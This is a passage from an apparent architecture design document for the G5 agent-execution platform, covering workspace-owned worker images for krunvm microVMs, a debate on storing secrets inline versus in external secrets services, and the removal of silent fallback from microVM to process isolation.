20. **Guest image pull strategy:** krunvm needs to pull the worker base OCI image. In cloud K8s, should the image be pre-pulled to a local registry sidecar, or pulled on demand from the main registry? Pre-pulling avoids cold-start latency but adds complexity.

21. **macOS distribution:** Homebrew tap vs. direct download vs. signed .pkg? For enterprise macOS fleets (Mac Mini racks), a .pkg with MDM deployment support is needed. For individual developers, Homebrew is simpler.

22. **ARM64 cloud nodes:** AWS Graviton, Azure Cobalt, GCP Tau T2A all provide ARM64 KVM. Should we explicitly support ARM64 cloud workers? krunvm/libkrun already supports aarch64 KVM. The main barrier is building the worker base image for linux/arm64 (already specified as multi-arch in the Dockerfile spec).

23. **Fallback policy for cloud:** If a cloud pod somehow lacks `/dev/kvm` (misconfigured node pool), should g5d fall back to ProcessBackend (weaker isolation) or refuse to start (exit code 5)? For multi-tenant SaaS: refuse. For self-hosted: configurable.

24. **E2E / dev testing without KVM (2026-02-13):** The Docker Compose E2E test stack (`docker-compose.test.yml`) defaults `G5D_ISOLATION_MODE` to `process` rather than `microvm`. This is because common development environments lack `/dev/kvm`: macOS Docker Desktop on Apple Silicon runs an ARM64 Linux VM without nested virtualization support, and devcontainers using Docker-in-Docker via socket forwarding don't expose `/dev/kvm` to inner containers. The `process` backend provides functionally equivalent behavior for E2E contract tests (git worktree isolation, tool execution, task lifecycle) — the only difference is the absence of the krunvm security boundary. To run E2E tests with full microVM isolation, set `G5D_ISOLATION_MODE=microvm` and ensure `/dev/kvm` is available (e.g., on a Linux host with KVM or in CI with nested virtualization enabled).

### 9.10 Worker Image as a Workspace Property

The worker base image — the OCI image that krunvm boots as the microVM guest rootfs — is a **workspace-level property**, not a global G5 setting. Each workspace owner decides what runs inside their workers.

#### 9.10.1 Design Principles

1. **Workspace owns the image.** The `isolation.base_image` field in `.g5/workspace.yaml` is the single source of truth for which OCI image g5d boots via krunvm.
2. **G5 doesn't build custom images.** G5 provides a default base image (`ghcr.io/g5/worker:base`). Users who want custom toolchains, languages, or dependencies build their own image and point their workspace at it.
3. **Users manage their own build pipeline.** GitHub Actions, GitLab CI, Cloud Build, Earthly — whatever CI the team already uses. G5 has no opinion on how the image is built, only that it's a valid OCI image in a registry g5d can pull from.
4. **Three pointing modes.** Track latest, pin a specific version, or use the G5 default.

#### 9.10.2 Workspace Configuration

```yaml
# .g5/workspace.yaml
isolation:
  mode: microvm
  # NO fallback field. microvm or fail.

  # === Image configuration ===
  image: "ghcr.io/acme/g5-worker:latest"   # Track latest from your registry
  # image: "ghcr.io/acme/g5-worker:v2.1.0" # Pin to a specific version
  # image: "ghcr.io/g5/worker:base"        # G5 default (omit field entirely for this)

  # Optional: registry credentials for private images
  registry_auth:
    # For local g5d: credentials helper (same as docker credential helpers)
    credential_helper: "gcloud"   # or "ecr-login", "acr", "gh"
    # For cloud K8s: reference to an imagePullSecret
    pull_secret: "acme-ghcr-pull" # K8s secret name in the worker namespace

  resources:
    cpus: 4
    memory_gb: 16
```

**Field rename:** `base_image` → `image`. The word "base" implied something G5-owned that users layer on top of. In reality, this IS the image — whatever the user points to. The old `base_image` field is accepted as a deprecated alias.

#### 9.10.3 Resolution Order

When g5d starts a task and needs to boot a krunvm microVM:

```
1. workspace.yaml isolation.image     → "ghcr.io/acme/g5-worker:latest"
2. workspace.yaml isolation.base_image (deprecated alias) → if image is absent
3. G5D_BASE_IMAGE env var             → operator override (self-hosted fleet management)
4. Compile-time default               → "ghcr.io/g5/worker:base"
```

The env var (`G5D_BASE_IMAGE`) exists so that self-hosted fleet operators can override the workspace setting for security (e.g., "all workers on this cluster MUST use our hardened image regardless of what workspace.yaml says"). In SaaS multi-tenant mode, workspace.yaml is authoritative.

#### 9.10.4 Image Requirements

Any image pointed to by `isolation.image` must satisfy:

| Requirement | Why |
|---|---|
| Linux rootfs (ext4 or squashfs) | krunvm boots it as a microVM guest |
| `/sbin/init` or configured entrypoint | krunvm needs a PID 1 |
| g5d agent binary at `/usr/local/bin/g5d-agent` | The agent loop that executes tools |
| `/dev/console` support | krunvm serial console for host↔guest communication |
| Rootless-compatible | No setuid binaries, no root processes |

Users building custom images should **start from the G5 base image** and layer their tools on top:

```dockerfile
FROM ghcr.io/g5/worker:base

# Add your project's toolchain
RUN apt-get update && apt-get install -y nodejs npm python3 python3-pip
COPY .tool-versions /etc/g5/tool-versions
RUN mise install  # or asdf, or whatever version manager

# Add private CA certs if needed
COPY corp-ca.crt /usr/local/share/ca-certificates/
RUN update-ca-certificates
```

#### 9.10.5 User Build Pipeline (Example: GitHub Actions)

G5 doesn't prescribe how images are built. A typical user pipeline:

```yaml
# .github/workflows/worker-image.yml
name: Build G5 Worker Image
on:
  push:
    paths: ['.g5/Dockerfile', '.tool-versions']
  schedule:
    - cron: '0 6 * * 1'  # Weekly rebuild for security patches

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      packages: write
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - uses: docker/build-push-action@v6
        with:
          context: .g5/
          file: .g5/Dockerfile
          push: true
          tags: |
            ghcr.io/${{ github.repository }}/g5-worker:latest
            ghcr.io/${{ github.repository }}/g5-worker:${{ github.sha }}
          platforms: linux/amd64,linux/arm64
          cache-from: type=gha
          cache-to: type=gha,mode=max
```

The workspace.yaml points at the output:
```yaml
isolation:
  image: "ghcr.io/acme/my-repo/g5-worker:latest"
```

#### 9.10.6 Image Pull Behavior

| Context | Pull Strategy |
|---|---|
| **Local g5d** | `krunvm pull` (or OCI pull via containers/image) using Docker credential helpers. Cached in `~/.local/share/g5/images/`. |
| **Cloud K8s pod** | g5d pulls inside the pod using the `imagePullSecret` referenced in `registry_auth.pull_secret`. Cached on pod-local ephemeral storage. NOT a K8s container image pull — this is an OCI pull by g5d itself, since krunvm boots from an image file, not a K8s container. |
| **Self-hosted (systemd)** | Same as local. Credential helpers configured in `/etc/g5/config.yaml` or `~/.config/g5/credentials`. |

**Cold start optimization:** For cloud workers, the image can be pre-cached on worker nodes via a DaemonSet that periodically pulls popular workspace images to a shared hostPath volume. This avoids per-task pull latency for teams that all use the same image.

#### 9.10.7 devcontainer.json Relationship

Many projects already define a `.devcontainer/devcontainer.json` (or `.devcontainer/Dockerfile`) for VS Code Remote Containers / Codespaces. There's a natural relationship:

- **devcontainer** = the dev environment for the human developer
- **worker image** = the execution environment for the G5 agent

These are often similar but not identical (the agent doesn't need VS Code Server, shell customizations, or GUI tools). The recommended pattern:

```
.devcontainer/
  Dockerfile            # Human dev environment (includes VS Code Server, shell config, etc.)
.g5/
  Dockerfile            # Agent worker image (leaner — just toolchains + g5d-agent)
  workspace.yaml        # Points to the built image
```

Both can share a common base:
```dockerfile
# .g5/base.Dockerfile — shared toolchain layer
FROM ubuntu:24.04
RUN apt-get update && apt-get install -y git curl build-essential nodejs python3
```

```dockerfile
# .devcontainer/Dockerfile
FROM .g5/base AS base
# Add VS Code Server, shell customizations, etc.

# .g5/Dockerfile
FROM .g5/base AS base
COPY --from=ghcr.io/g5/worker:base /usr/local/bin/g5d-agent /usr/local/bin/g5d-agent
# Add g5d agent + init system, skip VS Code stuff
```

Future: G5 could offer a `g5 image build` CLI command that auto-generates a `.g5/Dockerfile` from a `devcontainer.json`, stripping out human-specific layers and adding the g5d-agent. This is a convenience, not a requirement.

#### 9.10.8 Spec Impact

The following spec changes are required to implement workspace-owned images:

| Spec File | Change |
|---|---|
| `config.semlift.md` | Rename `base_image` → `image` in `WorkspaceIsolationConfig` (keep `base_image` as `#[serde(alias)]`). Add `registry_auth` sub-struct with `credential_helper` and `pull_secret` fields. |
| `config.semlift.md` | Add `image_pull()` method to `WorkspaceIsolationConfig` that resolves the image reference and pulls it using the configured credential helper. |
| `isolation.semlift.md` | Update `KrunvmBackend::start()` to use the workspace-resolved image instead of the global config `base_image`. Add image pull step before krunvm boot. |
| `g5.semlift.md` workspace.yaml example | Update the canonical example to show `image:` instead of `base_image:`, and add `registry_auth` example. |
| `infra.semlift.md` | Add DaemonSet spec for image pre-caching on worker nodes. Add imagePullSecret provisioning to the Helm chart. |
| `g5-api` scheduler | When dispatching a task to a worker pod, include the workspace's `image` field in the task spec so the worker knows which image to boot. |

#### 9.10.9 Rust Struct Changes

```rust
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct WorkspaceIsolationConfig {
    #[serde(default = "default_isolation_mode")]
    pub mode: String,
    pub fallback: Option<String>,

    /// OCI image reference for the worker microVM guest rootfs.
    /// Examples: "ghcr.io/g5/worker:base", "ghcr.io/acme/custom:v1.2.3"
    #[serde(default = "default_worker_image")]
    pub image: String,

    /// Deprecated alias for `image`. Accepted for backward compatibility.
    #[serde(default, alias = "base_image")]
    #[serde(skip_serializing)]
    _base_image_compat: Option<String>,

    /// Registry authentication for private images.
    #[serde(default)]
    pub registry_auth: Option<RegistryAuthConfig>,

    #[serde(default)]
    pub resources: Option<WorkspaceIsolationResources>,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct RegistryAuthConfig {
    /// Docker credential helper name (e.g., "gcloud", "ecr-login", "gh").
    /// Used by local g5d and self-hosted deployments.
    pub credential_helper: Option<String>,

    /// K8s imagePullSecret name for cloud deployments.
    pub pull_secret: Option<String>,
}

fn default_worker_image() -> String {
    "ghcr.io/g5/worker:base".to_string()
}

impl WorkspaceIsolationConfig {
    /// Resolve the effective image reference, handling the deprecated base_image alias.
    pub fn effective_image(&self) -> &str {
        if self.image != default_worker_image() {
            &self.image
        } else if let Some(ref legacy) = self._base_image_compat {
            legacy.as_str()
        } else {
            &self.image
        }
    }
}
```

---

## §10 Secrets Storage: The Debate

**Context:** §7 GAP 4 identified that the current spec stores all user-provided secrets (LLM API keys, custom credentials) as AES-256-GCM encrypted rows in PostgreSQL tables (`org_secrets`, `user_secrets`, `workspace_secrets`). The KEK comes from "Secret Manager / Vault." §8 proposed a `KeyManager` trait that abstracts the KEK source across cloud providers. The question now is: **should G5 store encrypted secrets at all, or should it delegate entirely to an external secrets service?**

### 10.1 The Three Options

#### Option A: Database-Encrypted Secrets (Current Design)

```
User → g5-api → encrypt(value, DEK) → store(value_enc, DEK_enc) → PostgreSQL
                                        ↑ KEK from KeyManager trait
```

- Secrets are AES-256-GCM encrypted at rest in `org_secrets`, `user_secrets`, `workspace_secrets`
- KEK sourced from cloud KMS / Vault / env var via `KeyManager` trait
- Envelope encryption: random DEK per row, DEK encrypted by KEK
- G5 owns the encryption, storage, resolution hierarchy, and audit logging

**Pros:**
- Self-contained: works anywhere PostgreSQL works (air-gapped, on-prem, single-node)
- Hierarchical resolution (workspace → user → org → parent org) is a simple SQL query
- No external dependency beyond a KEK source
- Fast: no network call to resolve a secret at task dispatch time (it's in the DB)
- Consistent: secret resolution is the same in all deployment modes

**Cons:**
- **G5's database contains encrypted secrets.** A database breach + KEK compromise = full exposure.
- G5 is in the business of managing crypto — envelope encryption, key rotation, DEK lifecycle. This is complex to get right and audit.
- Every secret is duplicated: once in the user's "real" secret manager (where they probably already have it) and once in G5's DB.
- Compliance: some enterprises prohibit storing credentials in application databases regardless of encryption.

#### Option B: External Secrets Service (Never Store)

```
User → g5-api → store(key, secret_ref) → PostgreSQL stores ONLY the reference
                                           ↓
Task dispatch → resolve(secret_ref) → External Secrets Service → plaintext value
                                       (Vault, AWS SM, Azure KV, GCP SM, etc.)
```

- G5 stores only a **reference** (path/ARN/URI) in the secret tables, never the encrypted value
- At task dispatch time, g5-api resolves the reference against the configured secrets backend
- The secrets backend handles encryption, rotation, audit, and access control

**Pros:**
- **G5 never possesses the secret.** Database breach reveals only references like `vault:secret/data/acme/openai_key` — useless without Vault access.
- No crypto to manage — the secrets service handles encryption, rotation, HSM backing
- Enterprises can use their existing secrets infrastructure (they already have Vault / AWS SM)
- Compliance-friendly: G5 is a secrets *consumer*, not a secrets *store*
- Secret rotation in the external service is automatic — G5 always gets the current value

**Cons:**
- **Requires an external secrets service.** Self-hosted / air-gapped / dev-laptop deployments now have a hard dependency on Vault (or similar). Massive increase in operational complexity for small deployments.
- **Latency at task dispatch.** Every secret resolution requires a network call to the secrets service. For a task that needs 3-5 secrets, that's 3-5 synchronous calls before the worker can start.
- **Hierarchical resolution becomes complex.** The current workspace → user → org → parent chain is a single SQL query with `ORDER BY depth DESC LIMIT 1`. With external references, each level might point to a different backend, requiring multiple network calls to different services.
- **Availability coupling.** If Vault is down, G5 can't dispatch tasks. The secrets service becomes a critical dependency in the hot path.
- **User experience.** Instead of "paste your API key in the G5 UI," users must "create a secret in Vault, then paste the Vault path in G5." This doubles the setup friction.

#### Option C: Hybrid — External Preferred, Database Fallback (Proposed)

```
# Multi-tenant SaaS (hosted):
User → g5-api → secret_ref → External Secrets Service (platform-managed)

# Self-hosted with Vault:
User → g5-api → secret_ref → Customer's Vault instance

# Self-hosted without Vault / dev laptop / air-gapped:
User → g5-api → encrypt(value, DEK) → PostgreSQL (envelope encryption)
```

Each secret entry has a `storage_mode`:

```sql
CREATE TABLE org_secrets (
    id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    org_id      UUID NOT NULL REFERENCES orgs(id) ON DELETE CASCADE,
    key         TEXT NOT NULL,
    
    -- Storage mode: 'inline' or 'reference'
    storage_mode TEXT NOT NULL DEFAULT 'inline',
    
    -- For storage_mode = 'inline': encrypted value (current design)
    value_enc   BYTEA,                -- NULL if storage_mode = 'reference'
    dek_enc     BYTEA,                -- NULL if storage_mode = 'reference'
    kek_version INT,                  -- NULL if storage_mode = 'reference'
    
    -- For storage_mode = 'reference': pointer to external secrets service
    secret_ref  TEXT,                 -- NULL if storage_mode = 'inline'
                                      -- e.g., "vault:secret/data/acme/openai_key"
                                      --       "aws-sm:arn:aws:secretsmanager:us-east-1:123:secret/g5/openai"
                                      --       "gcp-sm:projects/123/secrets/openai-key/versions/latest"
                                      --       "azure-kv:https://acme.vault.azure.net/secrets/openai-key"
    
    provider    TEXT,
    description TEXT,
    created_by  UUID REFERENCES users(id),
    created_at  TIMESTAMPTZ NOT NULL DEFAULT now(),
    updated_at  TIMESTAMPTZ NOT NULL DEFAULT now(),
    UNIQUE (org_id, key),
    
    -- Exactly one of value_enc or secret_ref must be non-NULL
    CONSTRAINT secret_value_xor CHECK (
        (storage_mode = 'inline' AND value_enc IS NOT NULL AND secret_ref IS NULL)
        OR (storage_mode = 'reference' AND secret_ref IS NOT NULL AND value_enc IS NULL)
    )
);
```

### 10.2 The Debate

#### Why not just Option B everywhere?

The instinct is "never store secrets" — that's the gold standard for security. But it creates a **deployment-mode dependency:**

| Deployment | External Secrets Service | Realistic? |
|---|---|---|
| Multi-tenant SaaS (GCP) | GCP Secret Manager | ✅ Platform-managed, always available |
| Multi-tenant SaaS (AWS) | AWS Secrets Manager | ✅ Platform-managed |
| Enterprise self-hosted (K8s) | HashiCorp Vault (enterprise) | ✅ Most enterprises running K8s already have Vault |
| Small team self-hosted | HashiCorp Vault (OSS) | ⚠️ Running Vault is significant operational burden for a 5-person team |
| Dev laptop | ??? | ❌ Not reasonable to require Vault for local development |
| Air-gapped | ??? | ❌ May not have any secrets service at all |
| CI/testing | ??? | ❌ Test environments shouldn't need real infrastructure |

The bottom three rows are the problem. Option B would either:
1. Force every developer to run a local Vault instance (absurd for a development tool), or
2. Require a completely different code path for "no-secrets-service" environments

#### Why not just Option A everywhere?

Option A works everywhere but has a fundamental problem in multi-tenant SaaS: **G5 holds all customers' secrets in a single PostgreSQL database.** Even with envelope encryption, this is a high-value target. A compromise of the database + KEK exposes every customer's LLM keys and custom credentials.

For multi-tenant SaaS, the platform's managed secrets service (GCP SM, AWS SM) provides:
- Hardware Security Module (HSM) backing for key storage
- Fine-grained IAM-scoped access (each customer's secrets in their own namespace)
- Built-in audit logging (Cloud Audit Logs, CloudTrail)
- Automatic rotation policies
- SOC2 / ISO27001 / FedRAMP certified infrastructure

None of this is replicable in a PostgreSQL column. Storing encrypted secrets in PG and calling it a day is appropriate for self-hosted deployments where the operator owns the risk. It's **not** appropriate for a multi-tenant SaaS where we hold other people's credentials.

#### The Verdict: Option C (Hybrid)

**Decision:** G5 supports both `inline` (database-encrypted) and `reference` (external secrets service) storage modes. The deployment profile determines the default, but individual secrets can override.

| Deployment Profile | Default `storage_mode` | Secrets Backend |
|---|---|---|
| `saas-gcp` | `reference` | GCP Secret Manager |
| `saas-aws` | `reference` | AWS Secrets Manager |
| `saas-azure` | `reference` | Azure Key Vault |
| `self-hosted` (with Vault) | `reference` | HashiCorp Vault |
| `self-hosted` (without Vault) | `inline` | PostgreSQL + `KeyManager` |
| `air-gapped` | `inline` | PostgreSQL + file-based KEK |
| Dev/test | `inline` | PostgreSQL + env var KEK |

### 10.3 Secrets Backend Trait

```rust
/// Abstracts secret value storage — either inline (DB-encrypted) or external.
#[async_trait]
pub trait SecretsBackend: Send + Sync {
    /// Store a secret value. Returns the storage reference.
    async fn store(&self, namespace: &str, key: &str, value: &[u8]) -> Result<SecretStorage>;
    
    /// Retrieve a secret value by its storage reference.
    async fn retrieve(&self, storage: &SecretStorage) -> Result<Vec<u8>>;
    
    /// Delete a secret.
    async fn delete(&self, storage: &SecretStorage) -> Result<()>;
    
    /// Rotate encryption (re-encrypt with new key version). No-op for external backends.
    async fn rotate(&self, storage: &SecretStorage) -> Result<SecretStorage>;
    
    /// Backend name for audit logging.
    fn backend_name(&self) -> &'static str;
}

pub enum SecretStorage {
    /// Encrypted value stored directly in the G5 database.
    Inline {
        value_enc: Vec<u8>,
        dek_enc: Vec<u8>,
        kek_version: u32,
    },
    /// Reference to an external secrets service.
    Reference {
        /// URI scheme: "vault:", "aws-sm:", "gcp-sm:", "azure-kv:"
        uri: String,
    },
}

// ── Implementations ──

/// Database-encrypted storage (envelope encryption with KeyManager).
pub struct InlineSecretsBackend {
    key_manager: Arc<dyn KeyManager>,
}

/// HashiCorp Vault.
pub struct VaultSecretsBackend {
    client: vaultrs::Client,
    mount: String,  // e.g., "secret" for KV v2
}

/// GCP Secret Manager.
pub struct GcpSecretsBackend {
    client: google_cloud_secretmanager::SecretManagerClient,
    project_id: String,
}

/// AWS Secrets Manager.
pub struct AwsSecretsBackend {
    client: aws_sdk_secretsmanager::Client,
    prefix: String,  // e.g., "g5/tenants/{tenant_id}/"
}

/// Azure Key Vault.
pub struct AzureSecretsBackend {
    client: azure_security_keyvault::SecretClient,
    vault_url: String,
}
```

### 10.4 Multi-Tenant SaaS: Per-Tenant Secret Namespacing

In multi-tenant SaaS mode with `storage_mode: reference`, each tenant's secrets must be isolated in the external service:

```
GCP Secret Manager:
  projects/{project}/secrets/g5-{org_id}-{key}/versions/latest

AWS Secrets Manager:
  g5/tenants/{org_id}/secrets/{key}

HashiCorp Vault:
  secret/data/g5/tenants/{org_id}/{key}

Azure Key Vault:
  https://{vault}.vault.azure.net/secrets/g5-{org_id}-{key}
```

**IAM scoping:** In SaaS mode, g5-api has a single service identity with access to the full `/g5/tenants/*` namespace. Application-level authorization (the existing RBAC checks) ensures that org A's API call can't read org B's secrets. The external secrets service provides encryption and audit, not tenant isolation — tenant isolation is an application concern.

**Why not per-tenant Vault namespaces / GCP projects?** It would provide stronger isolation but is operationally infeasible at scale. Creating a GCP Secret Manager secret for each customer's each key is fine (SM supports millions of secrets). Creating separate GCP projects or Vault namespaces per customer adds massive infrastructure management burden.

### 10.5 How Hierarchical Resolution Works with References

The resolution chain (workspace → user → org → parent org chain → platform default) already queries the database. The change is that the DB now returns either an encrypted value OR a reference:

```rust
impl SecretResolver {
    /// Resolve a secret key through the hierarchy.
    /// Returns the decrypted plaintext value from whatever backend stored it.
    pub async fn resolve(
        &self,
        workspace_id: Uuid,
        user_id: Uuid,
        key: &str,
    ) -> Result<Option<Vec<u8>>> {
        // 1. Query the hierarchy (same SQL as before, but now returns storage_mode + value_enc/secret_ref)
        let row = self.db.resolve_secret_hierarchical(workspace_id, user_id, key).await?;
        
        let Some(row) = row else { return Ok(None) };
        
        // 2. Resolve based on storage mode
        match row.storage_mode.as_str() {
            "inline" => {
                let storage = SecretStorage::Inline {
                    value_enc: row.value_enc.unwrap(),
                    dek_enc: row.dek_enc.unwrap(),
                    kek_version: row.kek_version.unwrap() as u32,
                };
                Ok(Some(self.inline_backend.retrieve(&storage).await?))
            }
            "reference" => {
                let storage = SecretStorage::Reference {
                    uri: row.secret_ref.unwrap(),
                };
                let backend = self.backend_for_uri(&storage)?;
                Ok(Some(backend.retrieve(&storage).await?))
            }
            _ => Err(G5Error::InvalidStorageMode(row.storage_mode)),
        }
    }
}
```

**Performance:** For `inline` secrets, this is identical to the current design — decrypt from the DB, zero network calls. For `reference` secrets, there's one extra network call to the external secrets service. Since task dispatch already involves scheduling, pod assignment, and secret bundling, one extra SM/Vault call adds negligible latency (typically 5-20ms).

### 10.6 User Experience

#### Multi-tenant SaaS UI:

```
┌─────────────────────────────────────────────────────┐
│  Org Settings > Secrets                              │
│                                                      │
│  + Add Secret                                        │
│                                                      │
│  ┌─────────────────┬──────────────────┬────────┐    │
│  │ Key             │ Provider         │ Status │    │
│  ├─────────────────┼──────────────────┼────────┤    │
│  │ anthropic_api_key │ Anthropic      │ ✅ Set  │    │
│  │ openai_api_key    │ OpenAI         │ ✅ Set  │    │
│  └─────────────────┴──────────────────┴────────┘    │
│                                                      │
│  When you set a secret, it's stored securely in      │
│  [platform secrets service]. G5 never stores or      │
│  logs the secret value.                              │
└─────────────────────────────────────────────────────┘
```

The user pastes their API key in the G5 UI. Behind the scenes, g5-api writes it to GCP Secret Manager and stores only the SM reference in PostgreSQL. The UX is identical to Option A — the user doesn't know or care that it's stored externally. **No "create a secret in Vault first" friction.**

#### Self-hosted (with Vault):

Enterprise admins can pre-provision secrets in Vault and then configure G5 to reference them:

```yaml
# In the admin panel or via API:
# Option 1: Paste the key (G5 stores it in Vault for you)
PUT /api/v1/orgs/{org}/secrets/anthropic_api_key
{ "value": "sk-ant-..." }
# → g5-api writes to Vault at secret/data/g5/tenants/{org}/anthropic_api_key

# Option 2: Point to an existing Vault path (G5 never sees the value)
PUT /api/v1/orgs/{org}/secrets/anthropic_api_key
{ "secret_ref": "vault:secret/data/shared/llm-keys/anthropic" }
# → g5-api stores only the reference
```

Option 2 is the "zero-knowledge" path — G5 literally never possesses the secret. It resolves the reference at task dispatch time. This is the path compliance-conscious enterprises will want.

#### Dev laptop / air-gapped:

```
$ g5d secrets set anthropic_api_key
Enter secret value: ****
✓ Secret stored (encrypted, local database)
```

No Vault, no cloud SM. Stored with envelope encryption in the local SQLite/PostgreSQL database. The developer owns the risk.

### 10.7 Configuring the Secrets Backend

```yaml
# g5-config.yaml (platform-level, not workspace-level)
secrets:
  # Default backend for new secrets
  backend: "gcp-sm"   # "inline" | "vault" | "gcp-sm" | "aws-sm" | "azure-kv"
  
  # Backend-specific configuration
  gcp_sm:
    project_id: "my-gcp-project"
  
  vault:
    address: "https://vault.internal:8200"
    mount: "secret"      # KV v2 mount path
    auth: "kubernetes"   # "kubernetes" | "token" | "approle"
    role: "g5-api"       # K8s auth role
  
  aws_sm:
    region: "us-east-1"
    # Uses IAM role from IRSA/pod identity — no explicit credentials
  
  azure_kv:
    vault_url: "https://g5-secrets.vault.azure.net"
    # Uses Workload Identity Federation — no explicit credentials
  
  # Inline (database-encrypted) backend — always available as fallback
  inline:
    key_manager: "env"   # "env" | "file" | "gcp-kms" | "aws-kms" | "vault-transit"
```

### 10.8 Spec Impact

| Spec File | Change |
|---|---|
| `g5.semlift.md` § secret tables | Add `storage_mode`, `secret_ref`, `dek_enc`, `kek_version` columns. Add XOR constraint. |
| `g5.semlift.md` § secret resolution | Update resolution algorithm to handle both inline and reference storage modes. |
| `g5-api` secrets routes | `PUT /secrets/{key}` accepts either `{ "value": "..." }` (store via backend) or `{ "secret_ref": "vault:..." }` (store reference only). |
| `g5d/config` | Add `secrets.backend` to platform config. Add `SecretsBackend` to dependency injection. |
| `g5-api` task dispatch | At dispatch time, resolve all `reference` secrets via `SecretsBackend::retrieve()` before building the encrypted credential blob. |
| New spec: `secrets-backend.semlift.md` | Full `SecretsBackend` trait spec, backend implementations, namespace patterns, rotation policy. |

### 10.9 Open Questions (Secrets)

24. **Secret caching at g5-api:** Should resolved `reference` secrets be cached in memory for a TTL (e.g., 60s) to avoid hitting Vault/SM on every task dispatch? Risk: stale secrets after rotation. Benefit: reduced latency and SM API quota usage.
25. **Cross-region secret replication:** In multi-region SaaS, should secrets be replicated across regions in the external SM, or should each region resolve from a single primary? GCP SM and AWS SM both support cross-region replication natively.
26. **Secret version pinning:** Should G5 resolve `versions/latest` (always get current) or pin to a specific version and require explicit rotation? Latest is simpler but risks surprise breakage if the user rotates the key in SM without testing.
27. **Inline-to-reference migration:** When an existing self-hosted deployment upgrades to Vault, how do we migrate existing inline secrets to the external backend? Need a `g5-admin secrets migrate --backend vault` CLI command that reads, re-stores, and updates the storage_mode.

---

## §11 No Silent Fallback: microvm Means microvm or Fail

### 11.1 The Problem

The current spec (and generated code) defines a **fallback** field in `IsolationConfig`:

```yaml
# .g5/workspace.yaml
isolation:
  mode: microvm
  fallback: process   # ← THIS IS THE PROBLEM
```

With this config, if krunvm/libkrun isn't available, g5d silently downgrades to `ProcessBackend` — a mode with **no isolation boundary at all**. The worker runs as a child process with direct access to the host filesystem, network, and all host credentials.

This is a security anti-pattern:
1. **Silent degradation.** The operator configured `mode: microvm` because they want VM-level isolation. Silently dropping to process mode violates that intent without any visible signal beyond an INFO log line.
2. **Multi-tenant SaaS.** In the hosted platform, falling back to process isolation means untrusted code from one customer runs with no isolation boundary. This is a security breach, not a graceful degradation.
3. **Compliance.** If an enterprise configures microVM isolation for compliance reasons, silent fallback to process mode breaks that compliance.
4. **Developer confusion.** On a laptop, the developer may not realize they're running without isolation. If they later deploy to production expecting isolation, they'll find it was never tested.

### 11.2 The Decision

**`fallback: process` is removed.** If `mode: microvm` and no microVM backend is available, g5d exits with error code 5. No silent degradation.

The `IsolationMode` enum and configuration become:

```rust
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum IsolationMode {
    /// krunvm microVM isolation. MUST be available or g5d refuses to start.
    Microvm,
    /// Explicit process-level isolation. No VM boundary. 
    /// The user has consciously chosen weaker isolation.
    Process,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct IsolationConfig {
    /// Isolation mode. No fallback — what you configure is what you get.
    #[serde(default = "default_isolation_mode")]
    pub mode: IsolationMode,
    
    // NO fallback field. Removed.
    
    /// OCI image for the worker microVM guest rootfs.
    #[serde(default = "default_worker_image")]
    pub image: String,
    
    #[serde(default)]
    pub registry_auth: Option<RegistryAuthConfig>,
    
    /// Resource limits for isolated workers.
    #[serde(default)]
    pub resources: IsolationResources,
}
```

### 11.3 Backend Selection Algorithm (Revised)

```
1. Read isolation.mode from config:

   mode: "microvm" →
     a. Probe KrunvmBackend (krunvm binary + KVM/HVF)
     b. If unavailable, probe Wsl2Backend (Windows WSL2 + containerd)
     c. If neither available:
        → EXIT CODE 5: "isolation mode is 'microvm' but no microVM backend
           is available. Install krunvm/libkrun and ensure KVM or HVF is
           enabled. To run without isolation (UNSAFE for multi-tenant),
           explicitly set isolation.mode: process"
        → Do NOT silently fall back.

   mode: "process" →
     a. Use ProcessBackend directly.
     b. Log WARNING: "Running in process isolation mode. No VM boundary.
        This is UNSAFE for multi-tenant deployments."
```

The key change: choosing `process` must be an **explicit, conscious decision** — not an automatic degradation from a failed microvm probe.

### 11.4 What Happens in Each Environment

| Environment | `mode` | What happens if krunvm unavailable |
|---|---|---|
| **Multi-tenant SaaS (cloud K8s)** | `microvm` (hardcoded by platform) | Pod fails to start (exit 5). Autoscaler replaces with new pod on a KVM-capable node. Operator alerted. |
| **Enterprise self-hosted (K8s)** | `microvm` (admin-configured) | Pod CrashLoopBackOff. Admin sees "install krunvm" error. Fix: install krunvm on nodes, or add KVM device plugin. |
| **Developer laptop (Linux, KVM)** | `microvm` (default) | g5d refuses to start.  Fix: `sudo apt install krunvm` and ensure `/dev/kvm` access. |
| **Developer laptop (macOS, ARM64)** | `microvm` (default) | Works — HVF always available on Apple Silicon. |
| **Developer laptop (macOS, Intel)** | `microvm` (default) | g5d refuses to start. libkrun doesn't support x86_64 HVF. Fix: `mode: process` (explicit opt-in, no isolation). |
| **Developer laptop (Windows)** | `microvm` (default) | Falls through to Wsl2Backend. If WSL2 not available, exit 5. Fix: enable WSL2 or `mode: process`. |
| **CI / testing** | `process` (explicit) | ProcessBackend. No isolation. Tests run fast. |
| **Air-gapped** | Admin-configured | Same as enterprise self-hosted. |

### 11.5 The `process` Mode Is Not Gone

`process` mode remains a valid, explicit choice. The change is that it can never be reached **implicitly**. You must write `mode: process` in your config. This is appropriate for:

- **Developer laptops** where the developer is running their own code (no multi-tenant risk).
- **CI environments** where isolation adds overhead and the CI runner is already ephemeral.
- **Intel Macs** where krunvm can't use HVF (no x86_64 macOS hypervisor support in libkrun).

The config is honest: if you write `mode: process`, you know what you're getting.

### 11.6 Error Messages

When microvm mode fails, the error message must be **actionable**, not just "backend not found":

```
ERROR: Isolation mode is 'microvm' but no microVM backend is available.

Checked:
  ✗ KrunvmBackend: krunvm binary not found in PATH
    → Install: https://github.com/containers/krunvm#installation
  ✗ Wsl2Backend: Not running on Windows / WSL2 not detected

To run without VM isolation (UNSAFE for production/multi-tenant):
  Set isolation.mode: process in .g5/workspace.yaml
  or: G5D_ISOLATION_MODE=process g5d --worker

Exit code: 5
```

On Linux where krunvm is found but `/dev/kvm` isn't accessible:

```
ERROR: Isolation mode is 'microvm' but KVM is not available.

Checked:
